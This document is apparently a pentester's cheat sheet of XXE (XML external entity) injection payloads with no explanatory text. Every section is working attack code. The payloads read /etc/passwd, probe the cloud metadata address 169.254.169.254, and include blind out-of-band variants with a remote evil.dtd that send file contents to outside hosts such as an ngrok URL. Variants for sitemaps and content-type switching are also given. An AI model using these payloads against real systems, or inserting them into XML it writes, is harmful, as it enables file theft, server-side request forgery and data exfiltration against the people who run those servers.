___

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<foo>
  &xxe;
</foo>
```

Request

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://poc.myserver.com/evil.dtd"> %xxe;]>
```

evil.dtd

```dtd
<!ENTITY % xxePOC SYSTEM "file:///etc/passwd">
<!ENTITY % exfildata "<!ENTITY exfil SYSTEM 'http://poc.mysite.com/?x=%xxePOC;'>">
%exfildata;
%exfil;
```

# Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="/sitemap.xsl"?>

<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">
    <url>
        <loc>https://www.google.com/</loc>
        <priority>1.0</priority>
    </url>
    <url>
        <loc>&xxe;</loc>
        <priority>1.0</priority>
    </url>
    <url>
        <loc>https://www.google.com/test-2</loc>
        <priority>1.0</priority>
    </url>
</urlset>
```

# Blind

```dtd
<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
<!ENTITY % paran1 "<!ENTITY exfil SYSTEM 'https://b99e-83-213-97-233.ngrok-free.app/?x=%data;'>">
```

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "https://b99e-83-213-97-233.ngrok-free.app/evil.dtd">%remote;%paran1;]> 
<contacts>  
   <contact>  
       <name>&exfil;</name>  
       <email>ben@test.com</email>  
   </contact>  
   <contact>  
       <name>adam</name>  
       <email>adam@test.com</email>  
   </contact>  
   <contact>  
       <name>test</name>  
       <email>test@test.com</email>  
   </contact>  
</contacts>
```

# Content Type Switch

Content-Type: application/xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
    <search>
        &xxe;
    </search>
</root>
```